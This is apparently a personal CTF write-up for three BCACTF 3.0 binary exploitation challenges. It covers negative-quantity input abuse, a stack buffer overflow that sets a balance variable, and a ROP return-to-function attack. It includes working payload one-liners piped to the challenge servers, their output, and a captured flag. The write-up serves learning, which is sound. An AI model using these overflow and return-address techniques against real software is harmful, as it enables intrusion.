The art/science of pwning programs (binary or otherwise) rests around the idea of unexpected inputs. 

Input into the program what the programmers never anticipated that you could input. Input extreme cases and see how the program reacts. The whole point of pwning is to find edge cases where the programmer's intention differs from the actual code.

You can find the source code for these challenges at <https://github.com/BCACTF/bcactf-3.0>

## Intro 2 Pwn

Connecting to the shell leads to:
```
Hi, welcome to Pwning 101.  
Your balance is $10. Please select an item:  
1. Buy a hamster ($1)  
2. Buy the flag ($100)
(1 or 2)>
```
Having done many challenges similar to this before, I knew what to do immediately. 

In this case, a pretty simple input is negative numbers, and sure enough, buying -90 hamsters makes our balance $10+90. And then we can just buy the flag ðŸ¤·.


##  BOF Shop
BOF presumably stands for buffer overflow. Again, experience was key here to me finding a quick solution. If you want to under stand how and *why* buffer overflows work, this is not the best post for you, but

```sh
python -c "print('A' * <count> + 'd')" | nc  
bin.bcactf.com 49174
```

The prompt said we need to overwrite the (presumably) integer that's storing the coins value to 100. Using an ASCII table, we know that the character `d` is equal to the integer 100, 
We can vary `count` manually to find the write number of bytes to write that results in the `d` getting put into the right position in memory.

Keep in mind here, that in x86_64, values are stored in little-endian. This means that putting 'd\0\0\0' (sending nothing is equal to leaving those bytes empty in this context) into a buffer in memory will result in the bytes getting read like
- d = 100 << 0
- \0 = 0 << 8
- \0 = 0 << 16
- \0 = 0 << 24

The number, if written down in conventional order (in base256) would be '\0\0\0d'. The first value supplied is the **least-significant** and the last one is **most-significant**.

```sh
python -c "print('A' * 116 + 'd')"  
| nc bin.bcactf.com 49174 Â   
Hello there, welcome to the BOF Shop!  
What's your name?  
> Your balance: 100 coins  
  
Wow. Here, take the flag in exchange for your 100 coins.  
bcactf{buFF3r_0v3rflow_M4D3_3asy_71f7e2}
```


## Jump Rope

Looking at the source, a basic ROP challenge. ROP stands for *return* oriented programming. ROP's elevator pitch is that you overwrite the *return* pointer (how the code knows where to return to after a function *returns*) using an existing buffer overflow. 

This challenge just requires us to overwrite the return pointer to a function that will print the flag (saw that in the provided source code).

We use `pwn checksec` to see that there is no **PIE** on this binary (PIE stands for Position Independent Executable), for us, it means that the addresses to the functions will always be the same, they won't have varying prefixes.
```sh
$ pwn checksec jumprope/jumprope  
[*] '/home/karmanyaahm/CTF/bca22/pwn/jumprope/jumprope'  
Â Â Â Arch: Â Â Â Â amd64-64-little  
Â Â Â RELRO: Â Â Â Partial RELRO  
Â Â Â Stack: Â Â Â No canary found  
Â Â Â NX: Â Â Â Â Â Â NX enabled  
Â Â Â PIE: Â Â Â Â Â No PIE (0x400000)
```

Then, use `readelf` to get the address of the function.
```sh
$ readelf -s jumprope | grep FUNC
Â Â Â 64: 00000000004010d0 Â Â Â 47 FUNC Â Â Â GLOBAL DEFAULT Â Â 15 _start  
Â Â Â 65: 00000000004011b6 Â Â 102 FUNC Â Â Â GLOBAL DEFAULT Â Â 15 a  
Â Â Â 67: 000000000040125a Â Â 109 FUNC Â Â Â GLOBAL DEFAULT Â Â 15 main  
Â Â Â 68: 0000000000000000 Â Â Â Â 0 FUNC Â Â Â GLOBAL DEFAULT Â UND fopen@@GLIBC_2.2.5  
Â Â Â 70: 0000000000401000 Â Â Â Â 0 FUNC Â Â Â GLOBAL HIDDEN Â Â Â 12 _init
```
(`readelf -s` prints all the symbols (functions, global variables, etc) and `grep FUNC` only prints functions from that list)


Then, we can send the address of the function, along with an offset that was found by guessing and checking to the binary.
In Python, `sys.stdout.buffer.write` is how you can print raw bytes (print only prints UTF-8 strings, which can cause issues for values such as the 0 byte, which isn't a valid UTF-8 character). 
I spent a while debugging my exploit on the remote server, to realize that I didn't include a `b"\n"` when using the write function, which print sends by default.

```sh
python -c 'from pwn import *; import sys; write = sys.stdout.buffer.write; write(b"A"*520 + p64(0x00000000004011b6) + b"\n")' | nc bin.bcactf.com 49177  
Here at BCA, fitness is one of our biggest priorities!  
Today's workout is going to be jumproping. Enjoy!  
  
Better start jumping!  
Woo, that was quite the workout wasn't it!

```
